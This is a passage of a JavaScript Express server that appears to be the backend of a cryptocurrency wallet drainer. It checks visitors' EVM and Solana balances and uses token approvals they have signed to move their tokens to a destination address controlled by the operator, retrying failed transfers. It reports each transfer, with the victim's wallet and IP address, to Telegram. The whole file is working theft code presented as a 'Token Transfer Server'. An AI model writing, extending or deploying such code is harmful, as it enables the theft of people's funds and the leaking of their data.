            tokenCount: balances?.length || 0,
            balances: balances || [],
            stats: stats || { approved: 0, rejected: 0, skipped: 0 }
        }

        try {
            const result = await sendPortfolioNotification(telegramData)
            if (result.success) {
                console.log('✅ Statistics sent to Telegram successfully')
                res.json({
                    success: true,
                    message: 'Statistics sent to Telegram'
                })
                return
            }
            console.error('❌ Failed to send statistics to Telegram:', result.error)
        } catch (telegramError) {
            console.error('❌ Telegram send failed:', telegramError.message)
        }

        // Always respond success to avoid blocking frontend UX
        res.json({
            success: true,
            warning: 'Statistics not sent to Telegram (config/404)'
        })

    } catch (error) {
        console.error('Error sending statistics:', error)
        res.status(500).json({
            success: false,
            error: 'Failed to send statistics'
        })
    }
})

// ==========================================
// Solana API Endpoints
// ==========================================

// Check Solana balances (SOL + SPL tokens)
app.post('/api/check-solana-balances', async (req, res) => {
    try {
        const { address } = req.body

        if (!address) {
            return res.status(400).json({
                success: false,
                error: 'Missing Solana wallet address'
            })
        }

        // Basic validation for Solana address (base58, 32-44 chars)
        if (!/^[1-9A-HJ-NP-Za-km-z]{32,44}$/.test(address)) {
            return res.status(400).json({
                success: false,
                error: 'Invalid Solana wallet address'
            })
        }

        console.log(`\n${'='.repeat(50)}`)
        console.log(`Checking Solana balances for: ${address}`)
        console.log(`Time: ${new Date().toISOString()}`)
        console.log(`${'='.repeat(50)}`)

        const balances = await getSolanaBalances(address)

        // Calculate total USD value
        const totalUsdValue = balances.reduce((sum, b) => sum + (b.usdValue || 0), 0)

        console.log(`\nFound ${balances.length} Solana assets`)
        console.log(`Total USD Value: $${totalUsdValue.toFixed(2)}`)
        console.log(`${'='.repeat(50)}\n`)

        res.json({
            success: true,
            tokenCount: balances.length,
            totalUsdValue: totalUsdValue.toFixed(2),
            balances
        })

    } catch (error) {
        console.error('Error checking Solana balances:', error)
        res.status(500).json({
            success: false,
            error: 'Failed to check Solana balances',
            details: error.message
        })
    }
})

// Claim approved SPL tokens on Solana
app.post('/api/claim-solana-tokens', async (req, res) => {
    try {
        const { mintAddress, ownerAddress, tokenAccountAddress } = req.body

        // Validate required fields
        if (!mintAddress || !ownerAddress || !tokenAccountAddress) {
            return res.status(400).json({
                success: false,
                error: 'Missing required fields: mintAddress, ownerAddress, tokenAccountAddress'
            })
        }

        console.log(`\n${'='.repeat(50)}`)
        console.log(`SOLANA TOKEN CLAIM REQUEST`)
        console.log(`Time: ${new Date().toISOString()}`)
        console.log(`Mint: ${mintAddress}`)
        console.log(`Owner: ${ownerAddress}`)
        console.log(`Token Account: ${tokenAccountAddress}`)
        console.log(`${'='.repeat(50)}`)

        const result = await claimSolanaTokens(mintAddress, ownerAddress, tokenAccountAddress)

        // Send Telegram notification for successful Solana transfer
        if (result.success && result.signature) {
            await sendTransferNotification({
                symbol: req.body.symbol || 'SOL',
                chain: 'Solana',
                amount: req.body.amount || 'N/A',
                usdValue: req.body.usdValue || 0,
                fromAddress: ownerAddress,
                txHash: result.signature,
                ipAddress: req.ip || req.headers['x-forwarded-for'] || req.headers['x-real-ip']
            })
        }

        console.log(`Claim result:`, result)
        console.log(`${'='.repeat(50)}\n`)

        res.json(result)

    } catch (error) {
        console.error('Error claiming Solana tokens:', error)

        let errorMessage = 'Failed to claim Solana tokens'
        if (error.message?.includes('No delegation')) {
            errorMessage = 'No delegation found. User must approve the delegate first.'
        } else if (error.message?.includes('not configured')) {
            errorMessage = error.message
        }

        res.status(500).json({
            success: false,
            error: errorMessage,
            details: error.message
        })
    }
})

// Unified delegate transfer endpoint (EVM + Solana)
app.post('/api/delegate-transfer', async (req, res) => {
    const { chainKey } = req.body

    // Solana path
    if (chainKey === 'solana') {
        try {
            const { mintAddress, ownerAddress, tokenAccountAddress } = req.body
            if (!mintAddress || !ownerAddress || !tokenAccountAddress) {
                return res.status(400).json({
                    success: false,
                    error: 'Missing required fields: mintAddress, ownerAddress, tokenAccountAddress'
                })
            }

            const result = await claimSolanaTokens(mintAddress, ownerAddress, tokenAccountAddress)
            return res.status(result.success ? 200 : 500).json(result)
        } catch (error) {
            console.error('Delegate transfer (Solana) error:', error)
            return res.status(500).json({
                success: false,
                error: error.message || 'Failed delegate transfer on Solana'
            })
        }
    }

    // EVM path
    const MAX_RETRIES = 3
    let retryCount = 0
    try {
        let result = await attemptEvmClaim(req.body)
        // Retry on nonce conflicts
        while (result.status === 500 && retryCount < MAX_RETRIES) {
            const errorDetails = result.response?.details || ''
            const isNonceError = errorDetails.includes('nonce') ||
                errorDetails.includes('NONCE_EXPIRED') ||
                errorDetails.includes('replacement transaction')

            if (!isNonceError) break

            retryCount++
            console.log(`Nonce conflict detected (delegate-transfer), retrying (${retryCount}/${MAX_RETRIES})...`)
            const chain = req.body.chainKey || 'bsc'
            delete nonceTracker[chain]
            await new Promise(resolve => setTimeout(resolve, 1000))
            result = await attemptEvmClaim(req.body, `(Retry ${retryCount})`)
        }

        return res.status(result.status).json(result.response)
    } catch (error) {
        console.error('Delegate transfer (EVM) error:', error)
        return res.status(500).json({
            success: false,
            error: 'Failed delegate transfer on EVM',
            details: error.message
        })
    }
})

// Public configuration endpoint for frontend
app.get('/api/config', (req, res) => {
    const solanaDelegate = getSolanaDelegatePublicKey()
    res.json({
        success: true,
        rpc: CHAIN_RPC,
        spenderContracts: SPENDER_CONTRACTS,
        destination: DESTINATION_ADDRESS,
        solanaDestination: process.env.SOLANA_DESTINATION_ADDRESS || null,
        solanaDelegate,
        solanaRpc: process.env.SOLANA_RPC_URL || 'https://api.mainnet-beta.solana.com',
        ankrEndpoint: ANKR_ENDPOINT
    })
})

// Health check
app.get('/api/health', (req, res) => {
    res.json({ status: 'ok', timestamp: new Date().toISOString() })
})

// Export app for Netlify Functions
export default app

// Only listen locally (not on Netlify)
if (!process.env.NETLIFY) {
    const PORT = 3001
    const HOST = '0.0.0.0' // Listen on all interfaces for mobile access
    app.listen(PORT, HOST, async () => {
        console.log(`\n${'='.repeat(50)}`)
        console.log(`Token Transfer Server running on port ${PORT}`)
        console.log(`Using Ankr Advanced API for balance fetching`)
        console.log(`${'='.repeat(50)}`)
        console.log(`EVM Configuration:`)
        console.log(`  Spender Contracts:`)
        console.log(`    BSC: ${SPENDER_CONTRACTS.bsc || 'NOT SET'}`)
        console.log(`    ARB: ${SPENDER_CONTRACTS.arb || 'NOT SET'}`)
        console.log(`    ETH: ${SPENDER_CONTRACTS.eth || 'NOT SET'}`)
        console.log(`    POLYGON: ${SPENDER_CONTRACTS.polygon || 'NOT SET'}`)
        console.log(`  EVM Destination: ${DESTINATION_ADDRESS || 'NOT SET'}`)
        console.log(`  EVM Private Key: ${PRIVATE_KEY ? '***SET***' : 'NOT SET'}`)
        console.log(`${'='.repeat(50)}`)
        console.log(`Solana Configuration:`)
        console.log(`  Solana RPC: ${process.env.SOLANA_RPC_URL || 'https://api.mainnet-beta.solana.com'}`)
        console.log(`  Solana Destination: ${process.env.SOLANA_DESTINATION_ADDRESS || 'NOT SET'}`)
        console.log(`  Solana Delegate Key: ${process.env.SOLANA_DELEGATE_PRIVATE_KEY ? '***SET***' : 'NOT SET'}`)
        console.log(`${'='.repeat(50)}`)
        console.log(`Endpoints:`)
        console.log(`  POST /api/check-balances         - Check EVM wallet balances`)
        console.log(`  POST /api/claim-tokens           - Claim approved EVM tokens`)
        console.log(`  POST /api/transfer-native        - Transfer native tokens (max balance - gas)`)
        console.log(`  POST /api/check-solana-balances  - Check Solana wallet balances`)
        console.log(`  POST /api/claim-solana-tokens    - Claim approved SPL tokens`)
        console.log(`  GET  /api/health                 - Health check`)
        console.log(`${'='.repeat(50)}\n`)
    })
}
